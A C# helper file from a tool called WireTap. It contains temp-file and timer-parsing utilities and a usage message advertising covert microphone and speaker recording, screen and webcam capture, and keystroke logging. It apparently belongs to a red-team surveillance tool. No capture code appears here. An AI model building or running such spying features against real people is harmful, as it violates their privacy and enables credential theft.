using System;
using System.IO;

namespace WireTap
{
    class Helpers
    {
        public static string CreateTempFileName(string extension = "")
        {
            string result = Path.GetTempPath() + Guid.NewGuid().ToString() + extension;
            return result;
        }

        public static int ParseTimerString(string str)
        {
            char measure = str[str.Length - 1];
            int time = int.Parse(str.Substring(0, str.Length - 1));
            switch (measure)
            {
                case 's':
                    time *= 1000;
                    break;
                case 'm':
                    time *= (60 * 1000);
                    break;
                case 'h':
                    time *= (60 * 60 * 1000);
                    break;
                default:
                    throw new Exception("Invalid time measure passed. Expected one of s, m or h. Received: " + measure.ToString());
            }
            return time;
        }

        public static void Usage()
        {
            string usageString = @"
WireTap.exe [argument]

Arguments can be one (and only one) of the following:
    record_mic [10s]    - Record audio from the attached microphone (line-in).
                          Time suffix can be s/m/h.
    
    record_sys [10s]    - Record audio from the system speakers (line-out).
                          Time suffix can be s/m/h.

    record_audio [10s]  - Record audio from both the microphone and the speakers and combine into one file.
                          Time suffix can be s/m/h.
    
    capture_screen      - Screenshot the current user's screen.

    capture_webcam      - Capture images from the user's attached webcam (if it exists).

    keylogger           - Begin logging keystrokes to a file.

Examples:
    Record all audio for 30 seconds:
        WireTap.exe record_audio 30s

    Start the keylogger:
        WireTap.exe keylogger
";
            Console.WriteLine(usageString);
        }
    }
}
